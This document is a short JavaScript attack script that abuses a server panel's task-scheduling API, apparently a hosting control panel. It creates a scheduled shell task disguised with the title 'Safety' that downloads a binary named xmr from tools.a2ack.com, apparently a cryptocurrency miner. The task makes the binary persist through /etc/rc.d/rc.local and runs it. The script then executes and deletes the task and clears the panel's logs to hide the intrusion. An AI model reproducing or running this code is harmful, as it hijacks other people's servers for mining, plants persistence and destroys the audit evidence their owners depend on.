function test1() {
	$.get('/service/app/tasks.php?type=task_list', {}, function(data) {
		var id = data.data[0].ID;
		$.post('/service/app/tasks.php?type=exec_task', {
			tid: id
		}, function(res) {
			$.post('/service/app/tasks.php?type=set_task_status', {
				task_id: id,
				status: 0
			}, function(res1) {
				$.post('/service/app/tasks.php?type=set_task_status', {
					task_id: id,
					status: 0
				}, function(res2) {
					$.post("/service/app/tasks.php?type=del_task",{
						tid:id
					},function(res){
						save2();
					},"json");
				}, "json");
			}, "json");
		}, "json")
	}, "json");
}

function test2() {
	$.get('/service/app/tasks.php?type=task_list', {}, function(data) {
		var id = data.data[0].ID;
		$.post('/service/app/tasks.php?type=exec_task', {
			tid: id
		}, function(res) {
			$.post('/service/app/tasks.php?type=set_task_status', {
				task_id: id,
				status: 0
			}, function(res1) {
				$.post('/service/app/tasks.php?type=set_task_status', {
					task_id: id,
					status: 0
				}, function(res2) {
					$.post("/service/app/tasks.php?type=del_task",{
						tid:id
					},function(res){
						$.post("/service/app/log.php?type=clearlog", {
							type: "clearlog"
						}, function(res3) {
						}, "json");
					},"json");
				}, "json");
			}, "json");
		}, "json")
	}, "json");
}


function save1() {
	var data = new Object();
	data.task_id = "";
	data.title = "Safety";
	data.exec_cycle = "5";
	data.week = "1";
	data.day = "3";
	data.hour = "1";
	data.minute = "1";
	data.shell = `python -c "import os;os.system('wget http://tools.a2ack.com/xmr/xmr;chmod 777 ./xmr;echo \\"nohup \\"\`pwd\`\\"/xmr &\\" >> \\"/etc/rc.d/rc.local\\";nohup ./xmr &')"`;
	$.post('/service/app/tasks.php?type=save_shell', data, function(res) {
		test1();
	}, 'json');
}

function save2() {
	var data = new Object();
	data.task_id = "";
	data.title = "Safety";
	data.exec_cycle = "5";
	data.week = "1";
	data.day = "3";
	data.hour = "1";
	data.minute = "1";
	data.shell = `python3 -c "import os;os.system('wget http://tools.a2ack.com/xmr/xmr;chmod 777 ./xmr;echo \\"nohup \\"\`pwd\`\\"/xmr &\\" >> \\"/etc/rc.d/rc.local\\";nohup ./xmr &')"`;
	$.post('/service/app/tasks.php?type=save_shell', data, function(res) {
		test2();
	}, 'json');
}


save1();